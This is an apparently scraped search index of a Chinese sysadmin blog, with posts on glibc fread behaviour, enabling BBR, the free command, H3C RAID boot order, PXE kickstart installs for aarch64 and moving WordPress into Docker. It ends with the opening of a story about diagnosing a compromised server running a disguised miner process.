+\u0026#34;%Y-%m-%d-%H:%M:%S\u0026#34;` centosVersion=$(awk \u0026#39;{print $(NF-1)}\u0026#39; /etc/redhat-release) VERSION=`date +%F` #日志相关 LOGPATH=\u0026#34;/tmp/awr\u0026#34; [ -e $LOGPATH ] || mkdir -p $LOGPATH RESULTFILE=\u0026#34;$LOGPATH/HostCheck-`hostname`-`date +%Y%m%d`.txt\u0026#34; #调用函数库 [ -f /etc/init.d/functions ] \u0026amp;\u0026amp; source /etc/init.d/functions export PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin source /etc/profile #root用户执行脚本 [ $(id -u) -gt 0 ] \u0026amp;\u0026amp; echo \u0026#34","title":"服务器巡检脚本"},{"content":"前言 有需求需要在 openeuler 的操作系统上测试一个 C 程序，做了一个简化版的程序，程序很简单，循环读取一个文件并打印文件内容，在程序执行过程中使用 echo 手动向文件中追加内容，程序要能读取到，效果如下：\n测试程序代码如下：\n#include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;unistd.h\u0026gt; int main(int argc, char **argv) { FILE *f = fopen(\u0026#34;./Syslog.log\u0026#34;, \u0026#34;rb\u0026#34;); if (f == NULL) return 1; char buffer[1024] = {0}; size_t len = 0; while(1) { len = fread(buffer, 1, sizeof(buffer), f); if (len \u0026gt; 0) { buffer[len] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;read:%s\\n\u0026#34;,buffer); } else { printf(\u0026#34;noread\\n\u0026#34;); } sleep(2); } return 0; } 在 Rhel-7.5 上测试一切正常，开始在 openeuler 上进行测试，结果发现后续追加的内容没有输出：\n故障排查 考虑到影响程序执行结果的几个因素：程序本身，内核版本，gcc版本，glibc版本。\n程序本身应该是没问题的，内核版本一般对C语言程序的影响也不会很大，还是优先看gcc版本和glibc版本。\n按照思路进行了一些测试，测试结果：\n可行： centos7.5（gcc-4.8.5，kernel-3.10，glibc\u0026lt;=2.28） centos7.5（gcc-7.3.0，kernel-3.10，glibc\u0026lt;=2.28） centos7.5（gcc-7.3.0，kernel-5.12，glibc\u0026lt;=2.28） 不可行： isoft-server-6.0（gcc-7.3.0，4.19.90，glibc\u0026gt;=2.28） centos8（gcc-8.4.0，kernel-4.18.0，glibc\u0026gt;=2.28） openeuler-20.03-LTS-SP1（gcc-7.3.0，kernel-4.19.90，glibc\u0026gt;=2.28） 按照测试结果，似乎 gcc 版本和内核版本对程序没什么影响，大概率应该是 glibc 版本导致的。由于程序很简单，只是以 rb 方式 fopen 打开文件循环读取文件内容，求证(google)起来也比较轻松，很快就找到了问题在哪：glibc 2.28修复了 fread 的行为\n这个 glibc 的 bug 是05年提的，到18年才修复，也是担心 break 之前大量的代码。https://sourceware.org/bugzilla/show_bug.cgi?id=1190\n现在再修改一下代码：\n#include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;unistd.h\u0026gt; int main(int argc, char **argv) { FILE *f = fopen(\u0026#34;./Syslog.log\u0026#34;, \u0026#34;rb\u0026#34;); if (f == NULL) return 1; char buffer[1024] = {0}; size_t len = 0; while(1) { len = fread(buffer, 1, sizeof(buffer), f); if (len \u0026gt; 0) { buffer[len] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;read:%s\\n\u0026#34;,buffer); } else { if (feof (f)) { printf(\u0026#34;Read error, clear error flag to retry...\\n\u0026#34;); clearerr (f); } } sleep(2); } return 0; } 添加了一块清除标记的片段，在 glibc\u0026gt;=2.28 的系统上程序也可以正常运行了\n","permalink":"https://lvbibir.github.io/posts/tech/record_of_program_test/","summary":"前言 有需求需要在 openeuler 的操作系统上测试一个 C 程序，做了一个简化版的程序，程序很简单，循环读取一个文件并打印文件内容，在程序执行过程中使用 echo 手动向","title":"记一次程序测试"},{"content":"介绍在CentOS7上部署BBR的详细过程 BBR简介：（Bottleneck Bandwidth and RTT）是一种新的拥塞控制算法，由Google开发。有了BBR，Linux服务器可以显着提高吞吐量并减少连接延迟\nROOT登陆后，终端执行以下命令\n1.查看当前内核版本\nuname -r 显示当前内核为3.10.0，因此我们需要更新内核\n1.使用 ELRepo RPM 仓库升级内核\nrpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org //无返回内容 rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-2.el7.elrepo.noarch.rpm 使用ELRepo repo更新安装5.12.3内核\nyum --enablerepo=elrepo-kernel install kernel-ml -y\n更新完成后，执行如下命令，确认更新结果\nrpm -qa | grep kernel\nkernel-ml-5.12.3-1.el7.elrepo.x86_64 //为更新后文件版本\n3.通过设置默认引导为 grub2 ，来启用5.12.3内核\negrep ^menuentry /etc/grub2.cfg | cut -f 2 -d \\'\n根据显示结果得知5.12.3内核处于行首，对应行号为 0 执行以下命令将其设置为默认引导项\ngrub2-set-default 0\n4.重启系统并确认内核版本\nshutdown -r now or reboot\n当服务器重新联机时，请进行root登录并重新运行uname命令以确认您当前内核版本\nuname -r\n至此完成内核更新与默认引导设置\n5.启用BBR\n执行命令查看当前拥塞控制算法\nsysctl -n net.ipv4.tcp_congestion_control\n启用 BBR 算法，需要对 sysctl.conf 配置文件进行修改，依次执行以下每行命令\necho \u0026#39;net.core.default_qdisc=fq\u0026#39; | tee -a /etc/sysctl.conf echo \u0026#39;net.ipv4.tcp_congestion_control=bbr\u0026#39; | tee -a /etc/sysctl.conf sysctl -p 进行BBR的启用验证\nsysctl net.ipv4.tcp_available_congestion_control sysctl -n net.ipv4.tcp_congestion_control 最后检查BBR模块是否已经加载\nlsmod | grep bbr\n至此，BBR的部署已全部完成。\n原文链接：https://blog.csdn.net/desertworm/article/details/116759380\n","permalink":"https://lvbibir.github.io/posts/tech/centos7_open_bbr/","summary":"介绍在CentOS7上部署BBR的详细过程 BBR简介：（Bottleneck Bandwidth and RTT）是一种新的拥塞控制算法，由Google开发。有了BB","title":"centos7开启bbr算法"},{"content":"CentOS6及以前 在CentOS6及以前的版本中，free命令输出是这样的：\n[root@wordpress ~]# free -m total used free shared buffers cached Mem: 1002 769 233 0 62 421 -/+ buffers/cache: 286 716 Swap: 1153 0 1153 第一行：\n​\t系统内存主要分为五部分：total(系统内存总量)，used(程序已使用内存)，free(空闲内存)，buffers(buffer cache)，cached(Page cache)。\n​\t系统总内存total = used + free； buffers和cached被算在used里，因此第一行系统已使用内存used = buffers + cached + 第二行系统已使用内存used\n​\t由于buffers和cached在系统需要时可以被回收使用，因此系统可用内存 = free + buffers + cached；\n​\tshared为程序共享的内存空间，往往为0。\n第二行：\n正因为buffers和cached中的一部分内存容量在系统需要时可以被回收使用，因此buffer和cached中有部分内存其实可以算作可用内存，因此：\n系统已使用内存，即第二行的used = total - 第二行free\n系统可用内存，即第二行的free = 第一行的free + buffers + cached\n第三行：\nswap内存交换空间使用情况\nCentOS7及以后 CentOS7及以后free命令的输出如下：\n[root@wordpress ~]# free -m total used free shared buff/cache available Mem: 1839 866 74 97 897 695 Swap: 0 0 0 buffer和cached被合成一组，加入了一个available，关于此available，文档上的说明如下：\nMemAvailable: An estimate of how much memory is available for starting new applications, without swapping.\n即系统可用内存，之前说过由于buffer和cache可以在需要时被释放回收，系统可用内存即 free + buffer + cache，在CentOS7之后这种说法并不准确，因为并不是所有的buffer/cache空间都可以被回收。\n即available = free + buffer/cache - 不可被回收内存(共享内存段、tmpfs、ramfs等)。\n因此在CentOS7之后，用户不需要去计算buffer/cache，即可以看到还有多少内存可用，更加简单直观。\nbuffer/cache相关介绍 什么是buffer/cache？ buffer 和 cache 是两个在计算机技术中被用滥的名词，放在不通语境下会有不同的意义。在 Linux 的内存管理中，这里的 buffer 指 Linux 内存的： Buffer cache 。这里的 cache 指 Linux 内存中的： Page cache 。翻译成中文可以叫做缓冲区缓存和页面缓存。在历史上，它们一个（ buffer ）被用来当成对 io 设备写的缓存，而另一个（ cache ）被用来当作对 io 设备的读缓存，这里的 io 设备，主要指的是块设备文件和文件系统上的普通文件。但是现在，它们的意义已经不一样了。在当前的内核中， page cache 顾名思义就是针对内存页的缓存，说白了就是，如果有内存是以 page 进行分配管理的，都可以使用 page cache 作为其缓存来管理使用。当然，不是所有的内存都是以页（ page ）进行管理的，也有很多是针对块（ block ）进行管理的，这部分内存使用如果要用到 cache 功能，则都集中到 buffer cache 中来使用。（从这个角度出发，是不是 buffer cache 改名叫做 block cache 更好？）然而，也不是所有块（ block ）都有固定长度，系统上块的长度主要是根据所使用的块设备决定的，而页长度在 X86 上无论是 32 位还是 64 位都是 4k 。\n明白了这两套缓存系统的区别，就可以理解它们究竟都可以用来做什么了。\n什么是 page cache Page cache 主要用来作为文件系统上的文件数据的缓存来用，尤其是针对当进程对文件有 read ／ write 操作的时候。如果你仔细想想的话，作为可以映射文件到内存的系统调用： mmap 是不是很自然的也应该用到 page cache ？在当前的系统实现里， page cache 也被作为其它文件类型的缓存设备来用，所以事实上 page cache 也负责了大部分的块设备文件的缓存工作。\n什么是 buffer cache Buffer cache 则主要是设计用来在系统对块设备进行读写的时候，对块进行数据缓存的系统来使用。这意味着某些对块的操作会使用 buffer cache 进行缓存，比如我们在格式化文件系统的时候。一般情况下两个缓存系统是一起配合使用的，比如当我们对一个文件进行写操作的时候， page cache 的内容会被改变，而 buffer cache 则可以用来将 page 标记为不同的缓冲区，并记录是哪一个缓冲区被修改了。这样，内核在后续执行脏数据的回写（ writeback ）时，就不用将整个 page 写回，而只需要写回修改的部分即可。\n如何回收 cache ？ Linux 内核会在内存将要耗尽的时候，触发内存回收的工作，以便释放出内存给急需内存的进程使用。一般情况下，这个操作中主要的内存释放都来自于对 buffer ／ cache 的释放。尤其是被使用更多的 cache 空间。既然它主要用来做缓存，只是在内存够用的时候加快进程对文件的读写速度，那么在内存压力较大的情况下，当然有必要清空释放 cache ，作为 free 空间分给相关进程使用。所以一般情况下，我们认为 buffer/cache 空间可以被释放，这个理解是正确的。\n但是这种清缓存的工作也并不是没有成本。理解 cache 是干什么的就可以明白清缓存必须保证 cache 中的数据跟对应文件中的数据一致，才能对 cache 进行释放。所以伴随着 cache 清除的行为的，一般都是系统 IO 飙高。因为内核要对比 cache 中的数据和对应硬盘文件上的数据是否一致，如果不一致需要写回，之后才能回收。\n在系统中除了内存将被耗尽的时候可以清缓存以外，我们还可以使用下面这个文件来人工触发缓存清除的操作：\n[root@tencent64 ~]# cat /proc/sys/vm/drop_caches\n方法是：\necho 3 \u0026gt; /proc/sys/vm/drop_caches 当然，这个文件可以设置的值分别为 1 、 2 、 3 。它们所表示的含义为：\n表示清除 pagecache echo 1 \u0026gt; /proc/sys/vm/drop_caches 表示清除回收 slab 分配器中的对象（包括目录项缓存和 inode 缓存）。 slab 分配器是内核中管理内存的一种机制，其中很多缓存数据实现都是用的 pagecache echo 2 \u0026gt; /proc/sys/vm/drop_caches 表示清除 pagecache 和 slab 分配器中的缓存对象。 echo 3 \u0026gt; /proc/sys/vm/drop_caches 参考 https://blog.csdn.net/qq_41781322/article/details/87187957\n","permalink":"https://lvbibir.github.io/posts/tech/centos_free/","summary":"CentOS6及以前 在CentOS6及以前的版本中，free命令输出是这样的： [root@wordpress ~]# free -m total used free shared buffers cached Mem: 1002 769 233 0 62 421 -/+ buffers/cache: 286 716 Swap: 1153 0 1153 第一行： ​ 系","title":"centos中free命令详解"},{"content":"前端时间在国家信息中心的一个项目上需要在 H3C 服务器上安装操作系统然后配置一套 spring boot 项目，结果在装操作系统过程中就遇到了问题：安装完操作系统后无法自动引导，只能通过重启服务器按 F7 进入引导选项，选择对应的逻辑盘才能正常引导\n服务器有7块物理磁盘，前两块是 600 GB 的机械盘，后五块是 1T 的机械盘，前两块 600GB 的盘做了 raid1 ，剩下的5块盘，选择 n+2 做 raid6 。\n规划是这样的，操作系统安装在 raid6 上，raid1 那块逻辑磁盘等系统安装完后再进行挂载，用作业务的数据备份。\n安装完之后却发现有很多台系统引导不起来，必须手动引导，只有一台可以重启后直接进入系统。为了快速解决问题，还是第一时间联系了 H3C 的售后开工单解决，结果不言而喻，业务水平堪忧，并没有解决。不过也给我提供了一些思路。\n整理一下思路：\n出现问题之后更换安装介质重新安装了两次，问题都是一样的 系统安装这块操作肯定没问题，那问题就出在硬件上面了 开始寻找硬件上面的问题，服务器都是全新的，只是做了 raid 。询问了下做raid的同事，看可以正常引导的服务器和非正常引导的服务器之间 raid 配置有何不同\n问题估计找到了：正常服务器是先创建的 raid6 ，剩下的都是先创建的raid1。\n解决方案：\n系统需要重装：删除原先已经创建好的 raid，先创建系统使用的 raid6. 系统无需重装：删除掉 raid1 ，保存后重新创建 raid1。这时，raid6 的顺位会比raid1高，系统就可以正常启动了 最终我们这边采取的是第二种方案\n","permalink":"https://lvbibir.github.io/posts/tech/h3c_server_can_not_boot_system/","summary":"前端时间在国家信息中心的一个项目上需要在 H3C 服务器上安装操作系统然后配置一套 spring boot 项目，结果在装操作系统过程中就遇到了问题：安装完操作系统后无法","title":"H3C服务器装完系统无法引导"},{"content":"1、进入bios修改启动模式，将 UEFI 改为 Legacy bios\n2、 重启服务器，ctrl + r 进入 lsi 阵列卡管理\n3、选择对应阵列卡\n4、配置逻辑盘\n5、配置完逻辑盘后可以选择从某一块逻辑盘启动\nCtrl-P 进入到ctrl mgmt. -\u0026gt; TAB切换到boot device\n回车后可以看到当前的逻辑盘，上下选择要引导的逻辑盘即可。\nApply保存退出完成。\n","permalink":"https://lvbibir.github.io/posts/tech/h3c_server_config_raid/","summary":"1、进入bios修改启动模式，将 UEFI 改为 Legacy bios 2、 重启服务器，ctrl + r 进入 lsi 阵列卡管理 3、选择对应阵列卡 4、配置逻辑盘 5、配置完逻辑盘后可以","title":"H3C服务器配置raid"},{"content":"pxe环境 dhcp+tftp+http\npxe-server：isoft-serveros-v4.2（3.10.0-957.el7.isoft.x86_64）\n引导的iso：isoft-serveros-aarch64-oe1-v5.1（4.19.90-2003.4.0.0036.oe1.aarch64）\n物理服务器：浪潮 Inspur\ndhcpd.conf配置 [root@localhost isoft-5.1-arm]# vim /etc/dhcp/dhcpd.conf default-lease-time 43200; max-lease-time 345600; option space PXE; option arch code 93 = unsigned integer 16; option routers 192.168.1.1; option subnet-mask 255.255.255.0; option broadcast-address 192.168.1.255; option time-offset -18000; ddns-update-style none; allow client-updates; allow booting; allow bootp; next-server 192.168.1.1; if option arch = 00:07 or arch = 00:09 { filename \u0026#34;x86/bootx64.efi\u0026#34;; } else { filename \u0026#34;arm/grubaa64.efi\u0026#34;; } shared-network works { subnet 192.168.1.0 netmask 255.255.255.0 { range dynamic-bootp 192.168.1.221 192.168.1.253; } } grub.cfg配置 [root@localhost tftpboot]# vim arm/grub.cfg set default=\u0026#34;0\u0026#34; function load_video { if [ x$feature_all_video_module = xy ]; then insmod all_video else insmod efi_gop insmod efi_uga insmod ieee1275_fb insmod vbe insmod vga insmod video_bochs insmod video_cirrus fi } load_video set gfxpayload=keep insmod gzio insmod part_gpt insmod ext2 set timeout=60 ### END /etc/grub.d/00_header ### search --no-floppy --set=root -l \u0026#39;iSoftServerOS-5.1-aarch64\u0026#39; ### BEGIN /etc/grub.d/10_linux ### menuentry \u0026#39;Install iSoftServerOS 5.1 with GUI mode\u0026#39; --class red --class gnu-linux --class gnu --class os { # linux /images/pxeboot/vmlinuz inst.stage2=hd:LABEL=iSoftServerOS-5.1-aarch64 ro inst.geoloc=0 selinux=0 # initrd /images/pxeboot/initrd.img linux /arm51/vmlinuz ip=dhcp method=http://192.168.1.1/isoft-5.1-arm ks=http://192.168.1.1/isoft-5.1-arm/anaconda-ks.cfg initrd /arm51/initrd.img } #menuentry \u0026#39;Install iSoftServerOS 5.1 for ZF with GUI mode\u0026#39; --class red --class gnu-linux --class gnu --class os { # linux /arm51-zf/vmlinuz ip=dhcp method=http://192.168.1.1/isoft-5.1-zfarm # initrd /arm51-zf/initrd.img #} ks.cfg配置 [root@localhost isoft-5.1-arm]# vim anaconda-ks.cfg lang zh_CN.UTF-8 # Network information network --bootproto=dhcp --device=eno1 --ipv6=auto --no-activate network --bootproto=dhcp --device=eno2 --ipv6=auto network --bootproto=dhcp --device=eno3 --ipv6=auto network --bootproto=dhcp --device=eno4 --ipv6=auto network --bootproto=dhcp --device=enp22s0f0 --ipv6=auto network --bootproto=dhcp --device=enp22s0f1 --ipv6=auto network --bootproto=dhcp --device=enp22s0f2 --ipv6=auto network --bootproto=dhcp --device=enp22s0f3 --ipv6=auto network --hostname=localhost.localdomain # Root password rootpw --iscrypted $6$afv9h6qEnQTq3WSl$GHtOmvLkHrBin8vTWLbRaa2r.Ur9mUQR7XypWRoEWZYCwwJ2MnuMPxpNiNLSG1vSa5qBODHJcqIUUWkHm0IVl. # SELinux configuration selinux --disabled # X Window System configuration information xconfig --startxonboot # Run the Setup Agent on first boot firstboot --enable # System services services --enabled=\u0026#34;chronyd\u0026#34; # System timezone timezone Asia/Shanghai --isUtc user --groups=wheel --name=testuser --password=$6$9SyzoTjQU2syj2Bk$SQ4WZAV/go3KeX6rJN3cieNpY4l7aU2wHxad75yWlbKBh.ithhrU/jfA09JUq7cb10D0QTCwtClmItfg/N47t. --iscrypted --gecos=\u0026#34;testuser\u0026#34; # Disk partitioning information part /boot/efi --fstype=\u0026#34;efi\u0026#34; --ondisk=sda --size=200 --fsoptions=\u0026#34;umask=0077,shortname=winnt\u0026#34; part pv.521 --fstype=\u0026#34;lvmpv\u0026#34; --ondisk=sda --size=913974 part /boot --fstype=\u0026#34;ext4\u0026#34; --ondisk=sda --size=1024 volgroup isoftserveros --pesize=4096 pv.521 logvol /home --fstype=\u0026#34;xfs\u0026#34; --size=756272 --name=home --vgname=isoftserveros logvol swap --fstype=\u0026#34;swap\u0026#34; --size=4096 --name=swap --vgname=isoftserveros logvol / --fstype=\u0026#34;xfs\u0026#34; --size=153600 --name=root --vgname=isoftserveros %packages @^mate-desktop-environment @additional-devel @development @file-server @headless-management @legacy-unix @network-server @network-tools @scientific @security-tools @system-tools @virtual-tools %end %anaconda pwpolicy root --minlen=8 --minquality=1 --notstrict --nochanges --notempty pwpolicy user --minlen=8 --minquality=1 --notstrict --nochanges --emptyok pwpolicy luks --minlen=8 --minquality=1 --notstrict --nochanges --notempty %end reboot ","permalink":"https://lvbibir.github.io/posts/tech/pxe_install_aarch64_system/","summary":"pxe环境 dhcp+tftp+http pxe-server：isoft-serveros-v4.2（3.10.0-957.el7.isoft.x86_64） 引导的is","title":"pxe安装aarch64架构的操作系统"},{"content":"前言 前段时间着手开始搭建自己的wordpress博客，刚开始图方便直接买了阿里云的轻量应用服务器，它是一套预先搭建好的lamp架构，并已经做了一些初始化配置，直接访问ip就可以进行wordpress的安装和配置了。\n这套wordpress的一个非常好的优点就是可以在阿里云的控制台一键配置https证书，当然仅限在阿里云购买的ssl证书\n但是使用了一段时间，逐渐发现阿里这套wordpress的几个弊端\n前面没有反代保护，被攻击风险比较高 数据库和nginx的配置都不太合理 所有的东西都是提前配置好的，有点细节控的我还是想按照自己的想法进行配置 整理了一下思路，决定将wordpress整体迁移到docker中，全部服务都用docker跑。这样只要数据做好持久化，使用docker的灵活性会好很多。所有的服务目录和数据目录都可以自定义，做全站备份和迁移也很方便。\n备份\u0026amp;迁移 wordpress迁移起来还是比较方便的，需要备份的内容大概有这些：插件、主题、uploads、数据库\n备份插件：UpdraftPlus，这是一款个人使用过一款比较优秀的备份/迁移插件，免费版的功能基本满足大部分人需求，支持手动备份和定时备份、备份和恢复都支持部分备份，比如只备份数据库，只恢复数据库的某一张表。\n免费版的并不支持wordpress迁移，但我们可以通过导入导出备份文件的方式实现站点迁移，前提是做好测试。\n备份步骤：\n在备份插件中手动备份一次 下载备份文件 迁移步骤：\n准备好系统环境和docker环境（docker-compose） 启动docker容器 http访问wordpress地址初始化安装 安装备份插件和ssl插件（really simple ssl） 上传备份文件并进行恢复操作（不恢复wp-options表） 为nginx反代服务器配置ssl证书，开启https访问 在really simple ssl中为wordpress启用https 恢复wp-options表 手动备份\u0026amp;下载备份文件 备份完之后可以直接从web端下载，但是建议从web端下载一份，通过ssh或者ftp等方式再下载一份，避免备份文件出现问题\n备份的文件在wordpress目录/wp-content/updraft目录中\n通过scp下载到本地\n准备系统环境 安装好docker和docker-compose即可，docker的安装和使用教程在本博客中docker分类有\ndocker-compose一键启动wordpress环境 这里我提供了一键部署的docker-compose文件和各服务进行了优化的配置文件，可以直接拿来用下载链接\n注意：\n使用前建议修改数据库相关信息\n建议不要随意改动ip\n所有的数据文件和配置文件默认都在当前的目录下\n如果前面不加nginx反代，记得把注释掉的端口映射改成自己想要的\n所有的配置文件都在nginx目录下，已经预先定义好，可以自行进行修改\n内置的wordpress目录权限用户和组是 33:tape\nversion: \u0026#39;3.1\u0026#39; services: proxy: image: superng6/nginx:debian-stable-1.18.0 container_name: nginx-proxy restart: always networks: wordpress_net: ipv4_address: 172.19.0.6 ports: - 80:80 - 443:443 volumes: - /usr/share/zoneinfo/Asia/Shanghai:/etc/localtime:ro - $PWD/conf/proxy/nginx.conf:/etc/nginx/nginx.conf - $PWD/conf/proxy/default.conf:/etc/nginx/conf.d/default.conf - $PWD/ssl:/etc/nginx/ssl - $PWD/logs/proxy:/var/log/nginx depends_on: - web web: image: superng6/nginx:debian-stable-1.18.0 container_name: wordpress-nginx restart: always networks: wordpress_net: ipv4_address: 172.19.0.5 volumes: - /usr/share/zoneinfo/Asia/Shanghai:/etc/localtime:ro - $PWD/conf/nginx/nginx.conf:/etc/nginx/nginx.conf - $PWD/conf/nginx/default.conf:/etc/nginx/conf.d/default.conf - $PWD/conf/fastcgi.conf:/etc/nginx/fastcgi.conf - /dev/shm/nginx-cache:/var/run/nginx-cache # - $PWD/nginx-cache:/var/run/nginx-cache - $PWD/wordpress:/var/www/html - $PWD/logs/nginx:/var/log/nginx depends_on: - wordpress wordpress: image: wordpress:5-fpm container_name: wordpress-php restart: always networks: wordpress_net: ipv4_address: 172.19.0.4 environment: WORDPRESS_DB_HOST: db WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress WORDPRESS_DB_NAME: wordpress volumes: - /usr/share/zoneinfo/Asia/Shanghai:/etc/localtime:ro - $PWD/wordpress:/var/www/html - /dev/shm/nginx-cache:/var/run/nginx-cache # - $PWD/nginx-cache:/var/run/nginx-cache - $PWD/conf/uploads.ini:/usr/local/etc/php/php.ini depends_on: - redis - db redis: image: redis:5 container_name: wordpress-redis restart: always networks: wordpress_net: ipv4_address: 172.19.0.3 volumes: - /usr/share/zoneinfo/Asia/Shanghai:/etc/localtime:ro - $PWD/redis-data:/data depends_on: - db db: image: mysql:5.7 container_name: wordpress-mysql restart: always networks: wordpress_net: ipv4_address: 172.19.0.2 environment: MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress MYSQL_RANDOM_ROOT_PASSWORD: \u0026#39;1\u0026#39; volumes: - /usr/share/zoneinfo/Asia/Shanghai:/etc/localtime:ro - $PWD/mysql-data:/var/lib/mysql - $PWD/conf/mysqld.cnf:/etc/mysql/mysql.conf.d/mysqld.cnf networks: wordpress_net: driver: bridge ipam: config: - subnet: 172.19.0.0/16 进入到 wordpress-blog 目录下使用 docker-compose up -d启动docker容器\n配置nginx反向代理 配置80和443端口的反代\n把域名、证书路径以及后端服务器等信息换成自己的\n免费ssl证书的申请我在 阿里云wordpress配置免费ssl证书 中介绍过，直接下载nginx版的证书放到wordpress-blog/ssl/目录下即可\n[root@lvbibir ~]# vim wordpress-blog/conf/proxy/default.conf server { listen 80; listen [::]:80; server_name lvbibir.cn; # return 301 https://$host$request_uri; location / { proxy_pass http://172.19.0.5:80; proxy_redirect off; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Real-Port $remote_port; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header HTTP_X_FORWARDED_FOR $remote_addr; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header Host $host; proxy_set_header X-NginX-Proxy true; } } server { listen 443 ssl http2; listen [::]:443 ssl http2; server_name lvbibir.cn; location / { proxy_pass http://172.19.0.5:80; proxy_redirect off; # 保证获取到真实IP proxy_set_header X-Real-IP $remote_addr; # 真实端口号 proxy_set_header X-Real-Port $remote_port; # X-Forwarded-For 是一个 HTTP 扩展头部。 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; # 在多级代理的情况下，记录每次代理之前的客户端真实ip proxy_set_header HTTP_X_FORWARDED_FOR $remote_addr; # 获取到真实协议 proxy_set_header X-Forwarded-Proto $scheme; # 真实主机名 proxy_set_header Host $host; # 设置变量 proxy_set_header X-NginX-Proxy true; # 开启 brotli proxy_set_header Accept-Encoding \u0026#34;gzip\u0026#34;; } # 日志 access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; # 证书 ssl_certificate /etc/nginx/ssl/lvbibir.cn.pem; ssl_certificate_key /etc/nginx/ssl/lvbibir.cn.key; # curl https://ssl-config.mozilla.org/ffdhe2048.txt \u0026gt; /path/to/dhparam # ssl_dhparam /etc/nginx/ssl/dhparam; # HSTS (ngx_http_headers_module is required) (63072000 seconds) add_header Strict-Transport-Security \u0026#34;max-age=63072000\u0026#34; always; # OCSP stapling ssl_stapling on; ssl_stapling_verify on; # verify chain of trust of OCSP response using Root CA and Intermediate certs # ssl_trusted_certificate /etc/nginx/ssl/all.sleele.com/fullchain.cer; # replace with the IP address of your resolver resolver 223.5.5.5; resolver_timeout 5s; } [root@lvbibir ~]# docker exec -i nginx-proxy nginx -s reload 安装wordpress 现在已经可以通过http访问nginx反代的80端口访问wordpress了\n安装信息跟之前站点设置一样即可\n恢复备份 安装好之后启用插件，把备份文件上传到备份目录\n记得修改权限\n[root@lvbibir ~]# chown -R 33:tape wordpress-blog/wordpress/wp-content/ 恢复备份\n注：如果站点之前开启了https，在这步不要恢复wp-options表，不然会导致后台访问不了\n点击恢复即可\n配置ssl 启用 really simple ssl 插件，因为之前在nginx反代配置了ssl证书，虽然我们没有通过https访问，但是这个插件已经检测到了证书，可以一键为wordpress配置ssl\n这里我们已经可以通过https访问我们的wordpress了\n站点路径该插件也会自动修改，之前不恢复wp-options表的原因就在这，在我们没有配置好ssl之前，直接覆盖wordpress的各项设置会导致站点访问不了，重定向循环等各种各样的问题。\n恢复 wp-options 表 开启了ssl之后，通过备份插件再恢复一次，可以只恢复一张wp-options表，也可以再全量恢复下数据库，至此，站点迁移工作基本完成了。\n后续优化 开启https强制跳转 开启https强制跳转后，所有使用http访问我们站点的请求都会转到https，提高站点安全性\n[root@lvbibir ~]# vim /etc/nginx/nginx.conf server { listen 80; listen [::]:80; server_name lvbibir.cn; return 301 https://$host$request_uri; } server { listen 443 ssl http2; listen [::]:443 ssl http2; server_name lvbibir.cn; location / { proxy_pass http://172.19.0.5:80; proxy_redirect off; # 保证获取到真实IP proxy_set_header X-Real-IP $remote_addr; # 真实端口号 proxy_set_header X-Real-Port $remote_port; # X-Forwarded-For 是一个 HTTP 扩展头部。 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; # 在多级代理的情况下，记录每次代理之前的客户端真实ip proxy_set_header HTTP_X_FORWARDED_FOR $remote_addr; # 获取到真实协议 proxy_set_header X-Forwarded-Proto $scheme; # 真实主机名 proxy_set_header Host $host; # 设置变量 proxy_set_header X-NginX-Proxy true; # 开启 brotli proxy_set_header Accept-Encoding \u0026#34;gzip\u0026#34;; } # 日志 access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; # 证书 ssl_certificate /etc/nginx/ssl/lvbibir.cn.pem; ssl_certificate_key /etc/nginx/ssl/lvbibir.cn.key; # curl https://ssl-config.mozilla.org/ffdhe2048.txt \u0026gt; /path/to/dhparam # ssl_dhparam /etc/nginx/ssl/dhparam; # HSTS (ngx_http_headers_module is required) (63072000 seconds) add_header Strict-Transport-Security \u0026#34;max-age=63072000\u0026#34; always; # OCSP stapling ssl_stapling on; ssl_stapling_verify on; # verify chain of trust of OCSP response using Root CA and Intermediate certs # ssl_trusted_certificate /etc/nginx/ssl/all.sleele.com/fullchain.cer; # replace with the IP address of your resolver resolver 223.5.5.5; resolver_timeout 5s; } [root@lvbibir ~]# docker exec -i nginx-proxy nginx -s reload 开启redis缓存 wordpress搭配redis加速网站访问速度\n搭配jsdelivr-CDN实现全站cdn WordPress+jsDelivr开启伪全站CDN\n参考 从能用到好用-快速搭建高性能WordPress指南\n","permalink":"https://lvbibir.github.io/posts/blog/wordpress_to_docker/","summary":"前言 前段时间着手开始搭建自己的wordpress博客，刚开始图方便直接买了阿里云的轻量应用服务器，它是一套预先搭建好的lamp架构，并已经做","title":"wordpress迁移到docker"},{"content":"周一早上刚到办公室，就听到同事说有一台服务器登陆不上了，我也没放在心上，继续边吃早点，边看币价是不是又跌了。不一会运维的同事也到了，气喘吁吁的说：我们有台服务器被阿里云冻结了，理由：对外恶意发包。我放下酸菜馅的包子，ssh连了一下，被拒绝了，问了下默认的22端口被封了。让运维的同事把端口改了一下，立马连上去，顺便看了一下登录名:root，还有不足8位的小白密码，心里一凉：被黑了！\n服务器系统CentOS 6.X，部署了nginx，tomcat，redis等应用，上来先把数据库全备份到本地，然后top命令看了一下，有2个99%的同名进程还在运行，叫gpg-agentd。\ngoogle了一下gpg，结果是：\nGPG提供的gpg-agent提供了对SSH协议的支持，这个功能可以大大简化密钥的管理工作。\n看起来像是一个很正经的程序嘛，但仔细再看看服务器上的进程后面还跟着一个字母d，伪装的很好，让人想起来windows上各种看起来像svchost.exe的病毒。继续\nps eho command -p 23374netstat -pan | grep 23374 查看pid:23374进程启动路径和网络状况，也就是来到了图1的目录，到此已经找到了黑客留下的二进制可执行文件。接下来还有2个问题在等着我：\n1、文件是怎么上传的？ 